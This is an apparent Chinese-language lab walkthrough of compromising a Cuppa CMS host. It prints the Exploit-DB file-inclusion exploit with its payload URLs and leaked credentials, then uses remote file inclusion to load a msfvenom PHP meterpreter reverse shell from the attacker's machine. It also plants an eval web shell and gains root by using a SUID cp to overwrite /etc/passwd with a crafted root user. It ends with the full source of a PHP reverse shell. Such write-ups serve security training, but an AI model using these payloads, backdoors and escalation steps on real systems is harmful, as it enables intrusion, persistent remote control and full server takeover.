<p>\u8bbf\u95eehttp://192.168.56.15/devops/directortestpagev1.php</p> <p></p> <p>\u8bbf\u95eehttp://192.168.254.155/genevieve --&gt; \u00a0http://192.168.56.15/genevieve</p> <p></p> <p>\u7ee7\u7eed\u8bbf\u95ee\u8be5\u7ad9\u70b9\uff0c\u53d1\u73b0\u8be5\u7ad9\u70b9\u4e3acuppaCMS</p> <p></p> <p>\u641c\u7d22cuppaCMS\u76f8\u5173\u7684\u6f0f\u6d1e</p> <pre><code>\u2514\u2500# searchsploit cuppa   \n--------------------------------------------------------------- ---------------------------------\n Exploit Title                                                 |  Path\n--------------------------------------------------------------- ---------------------------------\nCuppa CMS - '/alertConfigField.php' Local/Remote File Inclusio | php/webapps/25971.txt\n--------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <p>\u67e5\u770b\u6f0f\u6d1e\u8be6\u60c5\u5e76\u5c1d\u8bd5\u5229\u7528</p> <pre><code>\u2514\u2500# searchsploit -p 25971.txt\n  Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion\n      URL: https://www.exploit-db.com/exploits/25971\n     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt\nFile Type: C++ source, ASCII text, with very long lines (876)\n</code></pre> <pre><code>\u2514\u2500# cat /usr/share/exploitdb/exploits/php/webapps/25971.txt\n# Exploit Title   : Cuppa CMS File Inclusion\n# Date            : 4 June 2013\n# Exploit Author  : CWH Underground\n# Site            : www.2600.in.th\n# Vendor Homepage : http://www.cuppacms.com/\n# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip\n# Version         : Beta\n# Tested on       : Window and Linux\n\n  ,--^----------,--------,-----,-------^--,\n  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..\n  `+---------------------------^----------|\n    `\\_,-------, _________________________|\n      / XXXXXX /`|     /\n     / XXXXXX /  `\\   /\n    / XXXXXX /\\______(\n   / XXXXXX /\n  / XXXXXX /\n (________(\n  `------'\n\n####################################\nVULNERABILITY: PHP CODE INJECTION\n####################################\n\n/alerts/alertConfigField.php (LINE: 22)\n\n-----------------------------------------------------------------------------\nLINE 22:\n        &lt;?php include($_REQUEST[\"urlConfig\"]); ?&gt;\n-----------------------------------------------------------------------------\n\n\n#####################################################\nDESCRIPTION\n#####################################################\n\nAn attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.\n\nhttp://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]\n\n#####################################################\nEXPLOIT\n#####################################################\n\nhttp://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?\nhttp://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd\n\nMoreover, We could access Configuration.php source code via PHPStream\n\nFor Example:\n-----------------------------------------------------------------------------\nhttp://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php\n-----------------------------------------------------------------------------\n\nBase64 Encode Output:\n-----------------------------------------------------------------------------\nPD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+\n-----------------------------------------------------------------------------\n\nBase64 Decode Output:\n-----------------------------------------------------------------------------\n&lt;?php\n        class Configuration{\n                public $host = \"localhost\";\n                public $db = \"cuppa\";\n                public $user = \"root\";\n                public $password = \"Db@dmin\";\n                public $table_prefix = \"cu_\";\n                public $administrator_template = \"default\";\n                public $list_limit = 25;\n                public $token = \"OBqIPqlFWf3X\";\n                public $allowed_extensions = \"*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx\";\n                public $upload_default_path = \"media/uploadsFiles\";\n                public $maximum_file_size = \"5242880\";\n                public $secure_login = 0;\n                public $secure_login_value = \"\";\n                public $secure_login_redirect = \"\";\n        }\n?&gt;\n-----------------------------------------------------------------------------\n\nAble to read sensitive information via File Inclusion (PHP Stream)\n\n################################################################################################################\n Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2\n################################################################################################################\n</code></pre> <p>\u8be5exp\u6709\u4e24\u4e2a\u6f0f\u6d1e\u70b9\uff0c\u4e00\u4e2a\u672c\u5730\u6587\u4ef6\u5305\u542b\u8bfb\u6587\u4ef6\uff0c\u4e00\u4e2a\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b</p> <p>\u90a3\u6211\u4eec\u5f00\u542fkali http\u670d\u52a1\uff0c\u5e76\u5236\u4f5c\u4e00\u4e2a\u53cd\u5f39shell\u6728\u9a6c\uff0c\u8ba9\u9776\u673a\u5bf9\u5176\u8fdb\u884c\u5305\u542b</p> <p>msfvenom\u751f\u6210\u4e00\u4e2aphp\u6728\u9a6c</p> <pre><code>msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.56.123 lport=4444 -f raw &gt; shell.php\n</code></pre> <p>\u63a5\u4e0b\u6765\u5f00\u542f4444\u7aef\u53e3\u76d1\u542c\u5e76\u5bf9\u8be5php\u6728\u9a6c\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u5e76\u5f00\u542f</p> <p><code>http://192.168.56.15/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.56.123/shell.php</code></p> <p>\u6210\u529f\u83b7\u53d6\u5230shell</p> <p></p> <p>\u63a5\u4e0b\u6765\u5c1d\u8bd5\u63d0\u6743\uff0c\u8be5\u4e3b\u673a\u4e3alinux\uff0c\u90a3\u4e48\u5c1d\u8bd5\u8fdb\u4e60\u60efSUID\u63d0\u6743</p> <p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n/usr/bin/cp\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/fusermount\n/usr/bin/chage\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/Xorg\n/usr/bin/pkexec\n/usr/bin/crontab\n/usr/bin/passwd\n/usr/bin/ksu\n/usr/bin/at\n/usr/bin/staprun\n/usr/sbin/pam_timestamp_check\n/usr/sbin/unix_chkpwd\n/usr/sbin/usernetctl\n/usr/sbin/userhelper\n/usr/sbin/mount.nfs\n/usr/lib/polkit-1/polkit-agent-helper-1\n/usr/libexec/dbus-1/dbus-daemon-launch-helper\n/usr/libexec/flatpak-bwrap\n/usr/libexec/sssd/krb5_child\n/usr/libexec/sssd/ldap_child\n/usr/libexec/sssd/selinux_child\n/usr/libexec/sssd/proxy_child\n/usr/libexec/qemu-bridge-helper\n/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper\n/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache\nsh-4.2$\n</code></pre> <p>\u53d1\u73b0cp\u547d\u4ee4\u53ef\u4ee5root\u8eab\u4efd\u514d\u5bc6\u7801\u4f7f\u7528</p> <p>\u8003\u8651\u81ea\u5df1\u5236\u4f5c\u4e00\u4e2aroot\u7528\u6237\u5e76\u6dfb\u52a0\u81f3/etc/passwd\u6587\u4ef6\u4e2d</p> <p>\u5148\u8bfb\u53d6/etc/passwd\u6587\u4ef6</p> <pre><code>root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\npolkitd:x:999:998:User for polkitd:/:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\npostfix:x:89:89::/var/spool/postfix:/sbin/nologin\nchrony:x:998:996::/var/lib/chrony:/sbin/nologin\ndavid:x:1000:1000:david:/home/david:/bin/bash\napache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\ngeoclue:x:997:995:User for geoclue:/var/lib/geoclue:/sbin/nologin\nmysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin\nnginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nlibstoragemgmt:x:995:991:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin\ngluster:x:994:990:GlusterFS daemons:/var/run/gluster:/sbin/nologin\nunbound:x:993:989:Unbound DNS resolver:/etc/unbound:/sbin/nologin\nqemu:x:107:107:qemu user:/:/sbin/nologin\nusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin\nrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin\ncolord:x:992:988:User for colord:/var/lib/colord:/sbin/nologin\nntp:x:38:38::/etc/ntp:/sbin/nologin\nabrt:x:173:173::/etc/abrt:/sbin/nologin\nsaslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin\npulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin\nsssd:x:990:984:User for sssd:/:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\nradvd:x:75:75:radvd user:/:/sbin/nologin\ngdm:x:42:42::/var/lib/gdm:/sbin/nologin\nsetroubleshoot:x:989:983::/var/lib/setroubleshoot:/sbin/nologin\ngnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\navahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin\nossec:x:1001:1002::/var/ossec:/sbin/nologin\nossecm:x:1002:1002::/var/ossec:/sbin/nologin\nossecr:x:1003:1002::/var/ossec:/sbin/nologin\nrick:x:1004:1004::/home/rick:/bin/bash\n</code></pre> <p>\u6211\u4eec\u5728/var/www/html\u76ee\u5f55\u4e0b\u505a\u4e00\u4e2a\u4e00\u53e5\u8bdd\u6728\u9a6c\u7136\u540e\u4f7f\u7528\u8681\u5251\u8fde\u63a5</p> <pre><code>sh-4.2$ pwd        \n/var/www/html\npwd\nsh-4.2$ echo '&lt;?php @eval($_POST[cmd]);?&gt;' &gt; ./hack.php\necho '&lt;?php @eval($_POST[cmd]);?&gt;' &gt; ./hack.php\nsh-4.2$ cat hack.php\ncat hack.php\n&lt;?php @eval($_POST[cmd]);?&gt;\n</code></pre> <p></p> <p>\u5236\u4f5c\u4e00\u4e2apasswd\u6587\u4ef6\uff0c\u5176\u4e2d\u5185\u5bb9\u4e3a\u9776\u673a\u7684passwd\u6587\u4ef6\uff0c\u5e76\u5c06\u505a\u597d\u7684root\u8eab\u4efd\u7528\u6237\u6dfb\u52a0\u81f3passwd\u6587\u4ef6\u672b\u5c3e\uff0c\u4e0a\u4f20\u81f3\u9776\u673a\u7136\u540ecp\u66ff\u4ee3\u9776\u673a\u7684/etc/passwd\u6587\u4ef6</p> <p>\u5236\u4f5c\u7684\u7528\u6237\u4e3a<code>sob:$1$sob$BmJLmGFTRiB9Pzlip0Dpa0:0:0::/root:/bin/bash</code></p> <p></p> <p>\u6700\u540e\u6210\u529f\u63d0\u6743</p> <p> </p> <p>PS:\u8fd9\u91cc\u8d34\u4e00\u4e0b\u7528\u5230\u7684php\u53cd\u5f39shell</p> <pre><code>&lt;?php\n\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '192.168.56.123';  // CHANGE THIS\n$port = 4444;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists('pcntl_fork')) {\n    // Fork and have the parent process exit\n    $pid = pcntl_fork();\n\n    if ($pid == -1) {\n        printit(\"ERROR: Can't fork\");\n        exit(1);\n    }\n\n    if ($pid) {\n        exit(0);  // Parent exits\n    }\n\n    // Make the current process a session leader\n    // Will only succeed if we forked\n    if (posix_setsid() == -1) {\n        printit(\"Error: Can't setsid()\");\n        exit(1);\n    }\n\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\n// Change to a safe directory\nchdir(\"/\");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 =&gt; array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 =&gt; array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 =&gt; array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won't\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n    // Check for end of TCP connection\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n\n    // Check for end of STDOUT\n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n\n    // Wait until a command is end down $sock, or some\n    // command output is available on STDOUT or STDERR\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    // If we can read from the TCP socket, send\n    // data to process's STDIN\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n\n    // If we can read from the process's STDOUT\n    // send data down tcp connection\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n\n    // If we can read from the process's STDERR\n    // send data down tcp connection\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we've daemonised ourself\n// (I can't figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n    if (!$daemon) {\n        print \"$string\\n\";\n    }\n}\n\n?&gt;\n</code></pre>"}]}